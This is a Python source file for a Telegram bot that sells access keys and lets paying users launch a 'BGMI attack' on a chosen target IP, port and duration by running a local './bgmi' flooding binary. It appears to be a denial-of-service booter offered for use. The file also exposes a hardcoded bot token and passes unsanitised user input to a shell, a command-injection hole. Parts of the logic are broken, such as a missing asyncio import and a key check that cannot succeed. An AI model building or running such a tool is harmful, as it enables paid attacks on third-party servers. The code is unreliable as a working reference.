import subprocess
import time
import datetime
import hmac
import hashlib
import os
import sys
import secrets
import string
from aiogram import Bot, Dispatcher, types
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.utils import executor

API_TOKEN = '7273247498:AAFlhOJKisrZzy_TmiR5HAIgXclWPPN2agE'
ADMIN_ID = '7046206053'
DEFAULT_KEY_EXPIRATION_MINUTES = 60  # Default key validity is 1 hour

# Function to generate a random secret key
def generate_secret_key(length=32):
    """
    Generate a random secret key of the specified length.
    """
    return ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(length))

# Generating the secret key
SECRET_KEY = generate_secret_key()

bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(bot, storage=storage)

start_time = time.time()
attack_process = None
user_keys = {}
user_verified_keys = set()
used_keys = set()

def start_main_script():
    print("Starting main script...")
    while True:
        try:
            executor.start_polling(dp, skip_updates=True)
            break
        except Exception as e:
            print(f"Error starting main script: {e}")
            print("Retrying in 10 seconds...")
            time.sleep(10)

# Function to generate an access key
def generate_key(expiration_minutes):
    timestamp = int(time.time())
    expiration_seconds = expiration_minutes * 60
    msg = f"{timestamp}".encode()
    key = hmac.new(SECRET_KEY.encode(), msg, hashlib.sha256).hexdigest()
    return key, timestamp, expiration_seconds

# Function to verify if a key is valid
def is_key_valid(key, timestamp, expiration_seconds):
    if key in used_keys:
        return False
    if time.time() - timestamp > expiration_seconds:
        return False
    expected_key, _, _ = generate_key(expiration_seconds // 60)
    return hmac.compare_digest(expected_key, key)

# Function to get the bot's uptime
def get_uptime():
    uptime_seconds = time.time() - start_time
    return str(datetime.timedelta(seconds=uptime_seconds))

async def send_message_with_creator_info(message: types.Message, response: str):
    if str(message.from_user.id) != ADMIN_ID:
        response += "\n\nThe creator of this bot is @NINJA666 👾"
    await message.reply(response)

@dp.message_handler(commands=['start'])
async def handle_start(message: types.Message):
    await send_message_with_creator_info(message, "🚀 Welcome! Please enter your access key using /enter_key <key>. ⏳")

@dp.message_handler(commands=['generate_key'])
async def handle_generate_key(message: types.Message):
    if str(message.from_user.id) != ADMIN_ID:
        await send_message_with_creator_info(message, "❌ You Are Not Authorized To Use This Command ❌")
        return

    command = message.text.split()
    if len(command) != 2 and len(command) != 3:
        await send_message_with_creator_info(message, "✅ Usage: /generate_key [expiration_minutes]")
        return

    expiration_minutes = int(command[1]) if len(command) == 2 else DEFAULT_KEY_EXPIRATION_MINUTES
    key, timestamp, expiration_seconds = generate_key(expiration_minutes)
    user_keys[key] = (timestamp, expiration_seconds)
    await send_message_with_creator_info(message, f"🔑 Generated Key: {key}. It will expire in {expiration_minutes} minutes. ⏳")

@dp.message_handler(commands=['add_key'])
async def handle_add_key(message: types.Message):
    if str(message.from_user.id) != ADMIN_ID:
        await send_message_with_creator_info(message, "❌ You Are Not Authorized To Use This Command ❌")
        return
    
    command = message.text.split()
    if len(command) != 4:
        await send_message_with_creator_info(message, "✅ Usage: /add_key <key> <timestamp> <expiration_seconds>")
        return
    
    key, timestamp, expiration_seconds = command[1], int(command[2]), int(command[3])
    user_keys[key] = (timestamp, expiration_seconds)
    await send_message_with_creator_info(message, f"🔑 Key added successfully. Key: {key}")

@dp.message_handler(commands=['remove_key'])
async def handle_remove_key(message: types.Message):
    if str(message.from_user.id) != ADMIN_ID:
        await send_message_with_creator_info(message, "❌ You Are Not Authorized To Use This Command ❌")
        return

    command = message.text.split()
    if len(command) != 2:
        await send_message_with_creator_info(message, "✅ Usage: /remove_key <key>")
        return

    key = command[1]
    if key in user_keys:
        del user_keys[key]
        await send_message_with_creator_info(message, f"🔑 Key removed successfully. Key: {key}")
    else:
        await send_message_with_creator_info(message, f"❌ Key not found. Key: {key}")

@dp.message_handler(commands=['enter_key'])
async def handle_enter_key(message: types.Message):
    command = message.text.split()
    if len(command) != 2:
        await send_message_with_creator_info(message, "✅ Usage: /enter_key <key>")
        return

    key = command[1]
    if key in user_keys and is_key_valid(key, *user_keys[key]):
        used_keys.add(key)  # Mark key as used
        user_verified_keys.add(message.from_user.id)
        await send_message_with_creator_info(message, "✅ Key verified successfully. You can now use the bot commands.")
    else:
        await send_message_with_creator_info(message, "❌ Invalid key. Please buy a valid key from @NINJA666")

@dp.message_handler(commands=['add'])
async def handle_add(message: types.Message):
    if message.from_user.id not in user_verified_keys:
        await send_message_with_creator_info(message, "❌ You Are Not Authorized To Use This Command. Please enter a valid key using /enter_key <key>")
        return
    await send_message_with_creator_info(message, "➕ Add command executed. ✅")

@dp.message_handler(commands=['bgmi'])
async def handle_bgmi(message: types.Message):
    global attack_process
    command = message.text.split()
    
    if len(command) != 4:
        await send_message_with_creator_info(message, "✅ Usage: /bgmi <target> <port> <duration>")
        return

    if message.from_user.id not in user_verified_keys:
        await send_message_with_creator_info(message, "❌ You Are Not Authorized To Use This Command. Please enter a valid key using /enter_key <key>")
        return

    target, port, duration = command[1], int(command[2]), int(command[3])

    if attack_process and attack_process.poll() is None:
        await send_message_with_creator_info(message, "⚠️ An attack is already in progress. Please stop it before starting a new one.")
        return

    attack_command = f"./bgmi {target} {port} {duration} 500"
    try:
        attack_process = subprocess.Popen(attack_command, shell=True)
        await send_message_with_creator_info(message, f"🚀 BGMI Attack Started. Target: {target} Port: {port} Duration: {duration} seconds. 🕒")
    except Exception as e:
        await send_message_with_creator_info(message, f"⚠️ Error starting attack: {e}")

@dp.message_handler(commands=['stop'])
async def stop_attack(message: types.Message):
    global attack_process

    if message.from_user.id not in user_verified_keys:
        await send_message_with_creator_info(message, "❌ You Are Not Authorized To Use This Command. Please enter a valid key using /enter_key <key>")
        return

    if attack_process and attack_process.poll() is None:
        attack_process.terminate()
        attack_process = None
        await send_message_with_creator_info(message, "🛑 BGMI Attack Stopped Successfully ✅")
    else:
        await send_message_with_creator_info(message, "⚠️ No ongoing attack to stop ❌")

@dp.message_handler(commands=['exit'])
async def exit_command(message: types.Message):
    if str(message.from_user.id) != ADMIN_ID:
        await send_message_with_creator_info(message, "❌ You Are Not Authorized To Use This Command ❌")
        return

    await send_message_with_creator_info(message, "🔌 Bot is shutting down... 😴")
    await bot.close()
    await asyncio.sleep(5)
    os.execv(sys.executable, ['python'] + sys.argv)

@dp.message_handler(commands=['uptime'])
async def handle_uptime(message: types.Message):
    await send_message_with_creator_info(message, f"⏳ Bot Uptime: {get_uptime()}")

@dp.message_handler(commands=['ping'])
async def handle_ping(message: types.Message):
    await send_message_with_creator_info(message, "🏓 Pong! The bot is responsive. ✅")

@dp.message_handler(commands=['status'])
async def handle_status(message: types.Message):
    global attack_process

    if message.from_user.id not in user_verified_keys:
        await send_message_with_creator_info(message, "❌ You Are Not Authorized To Use This Command. Please enter a valid key using /enter_key <key>")
        return

    status_message = "📊 Bot Status:\n"
    if attack_process and attack_process.poll() is None:
        status_message += "✅ Current attack is ongoing.\n"
    else:
        status_message += "❌ No ongoing attack.\n"
    await send_message_with_creator_info(message, status_message)

@dp.message_handler(commands=['stat'])
async def handle_stat(message: types.Message):
    user_id = message.from_user.id
    if user_id not in user_keys or not is_key_valid(user_id, *user_keys[user_id]):
        await send_message_with_creator_info(message, "❌ You Are Not Authorized To Use This Command ❌")
        return
    await send_message_with_creator_info(message, "📈 Bot Statistics: Not implemented yet. 📊")

@dp.message_handler(commands=['creator'])
async def handle_creator(message: types.Message):
    await send_message_with_creator_info(message, "The creator of this bot is @NINJA666 👾")

@dp.message_handler(commands=['help'])
async def handle_help(message: types.Message):
    help_message = """
📖 Help Menu:

/start - Start the bot and receive a welcome message
/generate_key [expiration_minutes] - Generate an access key (Admin only)
/add_key <key> <timestamp> <expiration_seconds> - Manually add a key (Admin only)
/remove_key <key> - Remove an existing key (Admin only)
/enter_key <key> - Enter an access key to verify yourself
/add - Execute the add command (requires valid key)
/bgmi <target> <port> <duration> - Start a BGMI attack (requires valid key)
/stop - Stop the ongoing BGMI attack (requires valid key)
/exit - Shut down the bot (Admin only)
/uptime - Get the bot's uptime
/ping - Check if the bot is responsive
/status - Get the current status of the bot (requires valid key)

/help - Display this help message
"""
    await send_message_with_creator_info(message, help_message)

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)

